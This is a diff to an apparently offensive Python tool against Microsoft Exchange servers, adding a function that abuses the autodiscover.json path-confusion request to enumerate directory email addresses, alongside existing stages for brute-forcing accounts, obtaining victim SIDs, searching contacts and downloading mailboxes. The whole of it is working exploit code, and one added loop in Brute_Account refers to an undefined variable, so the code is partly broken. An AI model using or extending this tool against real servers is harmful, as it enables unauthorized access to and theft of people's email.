@@ -74,6 +74,42 @@ def GetSID(target, legacyDn):
     logger.debug("[Stage 2] Successfully obtained SID: " + sid)
     return sid
 
+
+def GetMails(target):
+    logger.debug("[Stage 444] Get 100 email users")
+    soap_body = '''<soap:Envelope
+  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
+  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
+  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Header>
+    <t:RequestServerVersion Version="Exchange2016" />
+  </soap:Header>
+ <soap:Body>
+    <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
+      <m:UnresolvedEntry>SMTP:</m:UnresolvedEntry>
+    </m:ResolveNames>
+  </soap:Body>
+</soap:Envelope>'''
+    stage444 = requests.post(
+        f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
+            "Content-Type": "text/xml",
+            "User-Agent": user_agent,
+            "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu"
+                            },
+        data=soap_body,
+        verify=False
+        )
+    # If status code 200 is NOT returned, the request failed
+    if stage444.status_code != 200:
+        logger.error("[Stage 444] Get 100 email users Error!")
+        exit()
+    folderXML = ET.fromstring(stage444.content.decode())
+    for item in folderXML.findall(".//t:EmailAddress", exchangeNamespace):
+        print(f"Email Address  : {item.text}")
+
+
+
 def Brute_Account(target,email):
     # logger.debug("[Stage 999] Brute Account With EWS ")
     soap_body = convertFromTemplate({'email':email},templatesFolder + "Brute_Account.xml")
@@ -93,7 +129,8 @@ def Brute_Account(target,email):
     # print(stage999.content.decode())
     if "Check credentials and try again" in stage999.content.decode():
         print(f"{email} valid")
-
+    for item in folderXML.findall(".//t:EmailAddress", exchangeNamespace):
+        print(item.text)
 
 
 def SearchContact(target,sid,keyword):
@@ -301,7 +338,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('--target',required=True, help='the target Exchange Server ip')
     parser.add_argument('--email', help='victim email')
-    parser.add_argument('--action',required=True,choices=['Brute','SearchC','SearchM','Download'], help='The action you want to take')
+    parser.add_argument('--action',required=True,choices=['Get','Brute','SearchC','SearchM','Download'], help='The action you want to take')
     parser.add_argument("--file", help="email files with your want brute accounts")
     parser.add_argument("--keyword", help="keyword with you want search")
     parser.add_argument("--folder",default="inbox", help="folder name with you want download")
@@ -313,6 +350,8 @@ if __name__ == '__main__':
             for emails in f.readlines():
                 email = emails.strip()
                 Brute_Account(args.target, email)
+    elif args.target and args.action == "Get":
+        emails = GetMails(args.target)
 
     elif args.target and args.email and args.action == "SearchC" and args.keyword:
         legacyDn = GetLegacyDN(args.target, args.email)
@@ -327,5 +366,5 @@ if __name__ == '__main__':
     elif args.target and args.email and args.action == "Download" and args.folder:
         legacyDn = GetLegacyDN(args.target, args.email)
         sid = GetSID(args.target, legacyDn)
-        Items = DownloadEmails(args.target, sid, args.folder)
+        emailsresult = DownloadEmails(args.target, sid, args.folder)
     
